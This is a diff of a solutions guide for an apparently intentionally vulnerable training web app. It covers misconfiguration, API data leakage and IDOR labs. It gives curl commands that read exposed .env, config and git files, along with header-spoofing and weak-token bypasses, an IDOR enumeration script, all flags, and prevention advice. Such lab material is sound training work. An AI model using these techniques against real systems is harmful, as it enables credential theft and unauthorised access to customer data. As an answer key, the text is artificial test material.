@@ -764,164 +764,373 @@ Authorization: Bearer anything
 ## Lab 8: Security Misconfiguration - EcoShop
 
 **URL:** `/labs/beginner/misconfig`
-**API Endpoints:**
-- `GET /api/labs/misconfig/search?q=` - Product search (verbose errors)
-- `GET /api/labs/misconfig/.env` - **HIDDEN** - Environment file
-- `GET /api/labs/misconfig/config.json` - **HIDDEN** - Configuration file
-- `GET /api/labs/misconfig/admin` - Admin panel with header bypass
-- `GET /api/labs/misconfig/server-status` - Server information disclosure
+**Scenario:** Real vulnerable e-commerce site with exposed config files and security misconfigurations.
 
-**Scenario:** E-commerce site with multiple security misconfigurations
+### Easy Mode Endpoints
 
-### Attack 1: Verbose Error Messages
+| Endpoint | Type | Description |
+|----------|------|-------------|
+| `/vuln/ecoshop/portal` | HTML | Main EcoShop portal |
+| `/vuln/ecoshop/.env` | File | Exposed environment file |
+| `/vuln/ecoshop/config.json` | File | Exposed configuration |
+| `/vuln/ecoshop/robots.txt` | File | Robots with hidden paths |
+| `/vuln/ecoshop/.git/config` | File | Exposed git config |
+| `/vuln/ecoshop/server-status` | HTML | Apache server status |
+| `/vuln/ecoshop/search?q='` | HTML | Verbose error disclosure |
 
-**Payload:**
-```
-GET /api/labs/misconfig/search?q='
-```
-Triggers database error with credentials in response.
+### Easy Mode Exploitation
 
-### Attack 2: Exposed Configuration Files
+**1. Find Hidden Files in HTML Comments:**
+View page source for hints: `/.env, /config.json, /robots.txt`
 
-```
-GET /api/labs/misconfig/.env
-GET /api/labs/misconfig/config.json
-```
-Returns full environment variables including:
-- Database credentials
-- AWS access keys
-- Stripe API keys
-- JWT secrets
-
-### Attack 3: Debug Header Bypass
-
-```
-GET /api/labs/misconfig/admin
-Headers: X-Debug-Mode: true
-```
-OR
-```
-Headers: X-Admin-Token: ecoshop_admin_2024
+**2. Access Exposed Configuration Files:**
+```bash
+curl /vuln/ecoshop/.env           # Database credentials, API keys
+curl /vuln/ecoshop/config.json    # Full configuration
+curl /vuln/ecoshop/robots.txt     # Hidden paths + admin token hint
+curl /vuln/ecoshop/.git/config    # Git credentials
 ```
 
-### Attack 4: Server Information Disclosure
-
+**3. Trigger Verbose Errors:**
+```bash
+curl "/vuln/ecoshop/search?q='"   # SQL error with DB credentials
 ```
-GET /api/labs/misconfig/server-status
-```
-Exposes internal IP, server versions, and system information.
 
-### Flags
-- `FLAG{VERBOSE_ERROR_EXPOSURE}` - Error-based credential leak
-- `FLAG{ENV_FILE_EXPOSED}` - .env file accessible
-- `FLAG{CONFIG_FILE_EXPOSED}` - config.json accessible
-- `FLAG{DEBUG_HEADER_ADMIN_BYPASS}` - X-Debug-Mode bypass
-- `FLAG{WEAK_ADMIN_TOKEN}` - Weak admin token
-- `FLAG{SERVER_INFO_DISCLOSURE}` - Server status exposure
+**4. Server Information Disclosure:**
+```bash
+curl /vuln/ecoshop/server-status  # Internal IP, versions
+```
+
+### Easy Mode Flags (6 flags)
+
+| Flag | Attack Vector |
+|------|--------------|
+| `FLAG{ENV_FILE_EXPOSED}` | Access /.env file |
+| `FLAG{CONFIG_FILE_EXPOSED}` | Access /config.json |
+| `FLAG{ROBOTS_TXT_INFO_LEAK}` | Robots.txt with secrets |
+| `FLAG{GIT_CONFIG_EXPOSED}` | /.git/config with PAT |
+| `FLAG{SERVER_INFO_DISCLOSURE}` | Server status page |
+| `FLAG{VERBOSE_ERROR_EXPOSURE}` | SQL error with credentials |
+
+---
+
+### Hard Mode - Bypass Admin Protection
+
+**Portal:** `/vuln/ecoshop-secure/portal`
+**Target Endpoints:**
+- `/api/ecoshop-secure/admin`
+- `/api/ecoshop-secure/config`
+- `/api/ecoshop-secure/users`
+
+### Hard Mode Bypasses
+
+**Bypass 1: Debug Header (Admin)**
+```bash
+curl -H "X-Debug-Mode: true" /api/ecoshop-secure/admin
+# FLAG{DEBUG_HEADER_ADMIN_BYPASS}
+```
+
+**Bypass 2: IP Whitelist (Admin)**
+```bash
+curl -H "X-Forwarded-For: 10.0.0.1" /api/ecoshop-secure/admin
+# FLAG{IP_WHITELIST_BYPASS}
+```
+
+**Bypass 3: Weak Admin Token (Admin)**
+```bash
+curl -H "X-Admin-Token: admin" /api/ecoshop-secure/admin
+curl -H "X-Admin-Token: ecoshop_admin_2024" /api/ecoshop-secure/admin
+# FLAG{WEAK_ADMIN_TOKEN}
+```
+
+**Bypass 4: Bearer Token (Config)**
+```bash
+curl -H "Authorization: Bearer anything" /api/ecoshop-secure/config
+# FLAG{CONFIG_BYPASS_BEARER_ANY}
+```
+
+**Bypass 5: Weak API Key (Config)**
+```bash
+curl -H "X-Api-Key: dev" /api/ecoshop-secure/config
+# FLAG{CONFIG_BYPASS_WEAK_APIKEY}
+```
+
+**Bypass 6: Referer Manipulation (Users)**
+```bash
+curl -H "Referer: https://ecoshop.com/admin" /api/ecoshop-secure/users
+# FLAG{USERS_BYPASS_REFERER}
+```
+
+### Hard Mode Flags (6 flags)
+
+| Flag | Bypass Technique |
+|------|-----------------|
+| `FLAG{DEBUG_HEADER_ADMIN_BYPASS}` | X-Debug-Mode: true |
+| `FLAG{IP_WHITELIST_BYPASS}` | X-Forwarded-For: 10.0.0.x |
+| `FLAG{WEAK_ADMIN_TOKEN}` | X-Admin-Token: admin |
+| `FLAG{CONFIG_BYPASS_BEARER_ANY}` | Authorization: Bearer xxx |
+| `FLAG{CONFIG_BYPASS_WEAK_APIKEY}` | X-Api-Key: dev |
+| `FLAG{USERS_BYPASS_REFERER}` | Referer: .../admin |
+
+**Total: 12 flags for Security Misconfiguration lab**
 
 ### Prevention
-- Disable verbose errors in production
-- Block access to configuration files
-- Remove debug endpoints/headers
-- Use proper authentication for admin routes
+- Block access to config files (.env, .git, etc.)
+- Disable verbose error messages in production
+- Implement proper authentication (not header-based)
+- Use IP allowlists on server, not application
+- Remove debug endpoints in production
 
 ---
 
 ## Lab 9: API Data Leakage - Developer Portal
 
-**URL:** `/labs/beginner/api-sensitive`
-**API Endpoint:** `GET /api/labs/api-leak/profile?debug=true`
-**Scenario:** API returning sensitive information in debug mode
+**URL:** `/labs/beginner/api-leak`
+**Scenario:** Real developer API portal with working "Enable Debug Mode" button that exposes secrets.
 
-### Exploitation Steps
+### Easy Mode - Debug Mode Button
 
-1. Navigate to the developer portal
-2. Access the profile API endpoint
-3. Add `?debug=true` query parameter
-4. Observe exposed secrets in response
+**Portal:** `/vuln/devportal/portal`
 
-**Request:**
+The portal has a visible **"Enable Debug Mode"** button that exposes sensitive data.
+
+### Easy Mode Exploitation
+
+**1. Click Debug Mode Button:**
+Navigate to portal and click the red "Enable Debug Mode" button.
+
+**2. API Endpoints with Debug:**
+```bash
+curl "/api/devportal/profile?debug=true"      # Full secrets
+curl "/api/devportal/profile?verbose=true"    # Alternative param
+curl "/api/devportal/profile?include_secrets=true"  # Another bypass
+curl "/api/devportal/users"                   # Hidden user endpoint
 ```
-GET /api/labs/api-leak/profile?debug=true
-```
 
-**Exposed data:**
+**Exposed Data:**
 - Password hashes
+- Secret API keys (sk_live_xxx)
 - Database connection strings
 - JWT signing secrets
-- Internal API keys
 
-### Flag
-- `FLAG{API_DEBUG_MODE_EXPOSURE}` - Accessing debug mode data
+### Easy Mode Flags (4 flags)
+
+| Flag | Attack Vector |
+|------|--------------|
+| `FLAG{API_DEBUG_MODE_EXPOSURE}` | ?debug=true param |
+| `FLAG{API_VERBOSE_MODE_LEAK}` | ?verbose=true param |
+| `FLAG{API_SECRETS_PARAM_LEAK}` | ?include_secrets=true |
+| `FLAG{API_USERS_ENDPOINT_EXPOSED}` | /api/devportal/users |
+
+---
+
+### Hard Mode - Bypass Debug Protection
+
+**Portal:** `/vuln/devportal-secure/portal`
+**Target Endpoint:** `/api/devportal-secure/profile`
+
+### Hard Mode Bypasses
+
+**Bypass 1: Debug Header Override**
+```bash
+curl -H "X-Debug-Override: true" /api/devportal-secure/profile
+# FLAG{API_DEBUG_HEADER_BYPASS}
+```
+
+**Bypass 2: Internal Request Header**
+```bash
+curl -H "X-Internal-Request: true" /api/devportal-secure/profile
+# FLAG{API_INTERNAL_HEADER_BYPASS}
+```
+
+**Bypass 3: Legacy Debug Parameters**
+```bash
+curl "/api/devportal-secure/profile?_debug=1"
+curl "/api/devportal-secure/profile?show_all=true"
+# FLAG{API_LEGACY_DEBUG_BYPASS}
+```
+
+**Bypass 4: Weak API Key (Users)**
+```bash
+curl -H "X-Api-Key: admin" /api/devportal-secure/users
+# FLAG{API_USERS_WEAK_APIKEY}
+```
+
+**Bypass 5: Bearer Token (Users)**
+```bash
+curl -H "Authorization: Bearer xxx" /api/devportal-secure/users
+# FLAG{API_USERS_BEARER_BYPASS}
+```
+
+### Hard Mode Flags (5 flags)
+
+| Flag | Bypass Technique |
+|------|-----------------|
+| `FLAG{API_DEBUG_HEADER_BYPASS}` | X-Debug-Override: true |
+| `FLAG{API_INTERNAL_HEADER_BYPASS}` | X-Internal-Request: true |
+| `FLAG{API_LEGACY_DEBUG_BYPASS}` | ?_debug=1 or ?show_all=true |
+| `FLAG{API_USERS_WEAK_APIKEY}` | X-Api-Key: admin |
+| `FLAG{API_USERS_BEARER_BYPASS}` | Authorization: Bearer xxx |
+
+**Total: 9 flags for API Data Leakage lab**
 
 ### Prevention
-- Disable debug endpoints in production
-- Use feature flags tied to environment
+- Disable all debug modes in production
 - Audit API responses for sensitive data
-- Implement proper access control
+- Use environment-based feature flags
+- Implement proper authentication (not weak headers)
+- Remove legacy debug parameters
 
 ---
 
 ## Lab 10: IDOR & Predictable IDs - Order System
 
 **URL:** `/labs/beginner/idor`
-**API Endpoints:**
-- `GET /api/labs/idor/orders/my` - Your orders
-- `GET /api/labs/idor/orders/:id` - Order details
+**Scenario:** Real e-commerce order system (ShopMax) with sequential order IDs exposing payment data.
 
-### Exploitation Steps
+### Easy Mode - Sequential Order IDs
 
-1. View your own orders (1003, 1004)
-2. Note the sequential order ID pattern
-3. Access other users' orders by manipulating the ID
+**Portal:** `/vuln/shopmax/portal`
 
-**IDOR Attack:**
+You're logged in as John Doe with orders #1003 and #1004. Other customers' orders (#1001, #1002, #1005) use sequential IDs.
+
+### Easy Mode Exploitation
+
+**1. Access Your Orders:**
+```bash
+curl /vuln/shopmax/portal           # See orders 1003, 1004
+curl /vuln/shopmax/order/1003       # Your order (safe)
 ```
-GET /api/labs/idor/orders/1001   (Alice's order)
-GET /api/labs/idor/orders/1002   (Bob's order)
+
+**2. Exploit IDOR with Other IDs:**
+```bash
+curl /vuln/shopmax/order/1001       # Alice's order + FLAG
+curl /vuln/shopmax/order/1002       # Bob's order + FLAG
+curl /vuln/shopmax/order/1005       # Carol's $1,299 laptop + FLAG
 ```
 
-**Exposed data:**
+**3. Access Invoices:**
+```bash
+curl /vuln/shopmax/invoice/INV-001  # Alice's invoice + FLAG
+curl /vuln/shopmax/invoice/INV-002  # Bob's invoice + FLAG
+```
+
+**Exposed Data:**
+- Full credit card numbers (4242-4242-4242-4242)
+- CVV codes
 - Full shipping addresses
-- Payment card numbers
-- Order details and pricing
+- Customer names and order history
+
+### Easy Mode Flags (2 flags)
+
+| Flag | Attack Vector |
+|------|--------------|
+| `FLAG{IDOR_ORDER_ACCESS}` | Access any non-owned order |
+| `FLAG{IDOR_INVOICE_ACCESS}` | Access any non-owned invoice |
+
+---
+
+### Hard Mode - Bypass Signature Validation
+
+**Portal:** `/vuln/shopmax-secure/portal`
+**Target Endpoints:**
+- `/api/shopmax-secure/order/:id`
+- `/api/shopmax-secure/orders/export`
+
+### Hard Mode Bypasses
+
+**Bypass 1: Weak Signature Values**
+```bash
+curl -H "X-Signature: admin" /api/shopmax-secure/order/1001
+curl -H "X-Signature: bypass" /api/shopmax-secure/order/1001
+# FLAG{IDOR_SIGNATURE_BYPASS}
+```
+
+**Bypass 2: Session Manipulation**
+```bash
+curl -H "X-User-Session: admin" /api/shopmax-secure/order/1001
+curl -H "X-User-Session: all" /api/shopmax-secure/order/1001
+# FLAG{IDOR_SESSION_BYPASS}
+```
+
+**Bypass 3: IP Whitelist Bypass**
+```bash
+curl -H "X-Forwarded-For: 127.0.0.1" /api/shopmax-secure/order/1001
+curl -H "X-Forwarded-For: 10.0.1.1" /api/shopmax-secure/order/1001
+# FLAG{IDOR_IP_WHITELIST_BYPASS}
+```
+
+**Bypass 4: Export Parameter Tampering**
+```bash
+curl "/api/shopmax-secure/orders/export?admin=true"
+curl "/api/shopmax-secure/orders/export?debug=true"
+# FLAG{IDOR_EXPORT_PARAM_BYPASS}
+```
+
+**Bypass 5: Weak Export API Key**
+```bash
+curl -H "X-Api-Key: dev" /api/shopmax-secure/orders/export
+curl -H "X-Api-Key: export" /api/shopmax-secure/orders/export
+# FLAG{IDOR_EXPORT_APIKEY_BYPASS}
+```
+
+### Hard Mode Flags (5 flags)
+
+| Flag | Bypass Technique |
+|------|-----------------|
+| `FLAG{IDOR_SIGNATURE_BYPASS}` | X-Signature: admin |
+| `FLAG{IDOR_SESSION_BYPASS}` | X-User-Session: admin |
+| `FLAG{IDOR_IP_WHITELIST_BYPASS}` | X-Forwarded-For: 127.0.0.1 |
+| `FLAG{IDOR_EXPORT_PARAM_BYPASS}` | ?admin=true or ?debug=true |
+| `FLAG{IDOR_EXPORT_APIKEY_BYPASS}` | X-Api-Key: dev |
+
+**Total: 7 flags for IDOR lab**
 
 ### Automation Script
 ```python
 import requests
 
-base_url = "https://your-site/api/labs/idor/orders"
+base_url = "https://your-site/vuln/shopmax"
 
-for order_id in range(1001, 1010):
-    r = requests.get(f"{base_url}/{order_id}")
-    data = r.json()
-    if "order" in data:
-        print(f"Order {order_id}: {data['order']['shippingAddress']['name']}")
+# Easy mode
+for order_id in range(1001, 1006):
+    r = requests.get(f"{base_url}/order/{order_id}")
+    if "IDOR" in r.text:
+        print(f"Order {order_id}: IDOR found!")
+
+# Hard mode bypasses
+headers_to_try = [
+    {"X-Signature": "admin"},
+    {"X-User-Session": "admin"},
+    {"X-Forwarded-For": "127.0.0.1"},
+]
+for h in headers_to_try:
+    r = requests.get(f"{base_url}-secure/order/1001", headers=h)
+    print(r.json())
 ```
-
-### Flag
-- `FLAG{IDOR_ORDER_ACCESS}` - Accessing another user's order
 
 ### Prevention
 - Use UUIDs instead of sequential IDs
-- Implement proper authorization checks
-- Validate user ownership of resources
+- Implement server-side authorization checks
+- Don't trust client-provided headers for auth
+- Use HMAC signatures with proper secrets
+- Validate user ownership on every request
 
 ---
 
 ## Summary
 
-| Lab | Vulnerability | Flag(s) |
-|-----|--------------|---------|
-| 1 | SQL Injection | 16 flags: Auth bypass, UNION attacks, table/column enumeration, password dump, credit card dump, admin secrets, boolean blind, OR-based dump |
-| 2 | XSS | `FLAG{STORED_XSS_INJECTION}`, `FLAG{REFLECTED_XSS_SEARCH}` |
-| 3 | JWT Auth Bypass | `FLAG{JWT_ALGORITHM_NONE_BYPASS}`, `FLAG{JWT_ROLE_TAMPERING_SUCCESS}` |
-| 4 | Command Injection | `FLAG{COMMAND_INJECTION_RCE}` |
-| 5 | Sensitive Data | `FLAG{SENSITIVE_DATA_EXPORT_EXPOSED}`, `FLAG{BULK_SENSITIVE_DATA_LEAK}`, `FLAG{BACKUP_CREDENTIALS_EXPOSED}`, `FLAG{DEBUG_ENDPOINT_DISCOVERED}` |
-| 6 | XXE | `FLAG{XXE_FILE_READ_PASSWD}`, `FLAG{XXE_FILE_READ_SHADOW}`, `FLAG{XXE_SECRET_FILE_ACCESS}`, `FLAG{XXE_ARBITRARY_FILE_READ}`, `FLAG{XXE_SSRF_ATTACK}`, `FLAG{XXE_PARAMETER_ENTITY}` |
-| 7 | Access Control | `FLAG{IDOR_PRIVILEGE_ESCALATION}`, `FLAG{IDOR_HORIZONTAL_ACCESS}` |
-| 8 | Misconfiguration | `FLAG{VERBOSE_ERROR_EXPOSURE}`, `FLAG{ENV_FILE_EXPOSED}`, `FLAG{CONFIG_FILE_EXPOSED}`, `FLAG{DEBUG_HEADER_ADMIN_BYPASS}`, `FLAG{WEAK_ADMIN_TOKEN}`, `FLAG{SERVER_INFO_DISCLOSURE}` |
-| 9 | API Leakage | `FLAG{API_DEBUG_MODE_EXPOSURE}` |
-| 10 | IDOR | `FLAG{IDOR_ORDER_ACCESS}` |
+| Lab | Vulnerability | Easy Flags | Hard Flags | Total |
+|-----|--------------|-----------|------------|-------|
+| 1 | SQL Injection | 16 | - | 16 |
+| 2 | XSS | 2 | - | 2 |
+| 3 | JWT Auth Bypass | 2 | - | 2 |
+| 4 | Command Injection | 1 | - | 1 |
+| 5 | Sensitive Data | 6 | 4 | 10 |
+| 6 | XXE | 6 | - | 6 |
+| 7 | Access Control | 4 | 7 | 11 |
+| 8 | Misconfiguration | 6 | 6 | 12 |
+| 9 | API Leakage | 4 | 5 | 9 |
+| 10 | IDOR | 2 | 5 | 7 |
 
-Total: 40+ flags across 10 labs
+**Total: 76 flags across 10 labs**
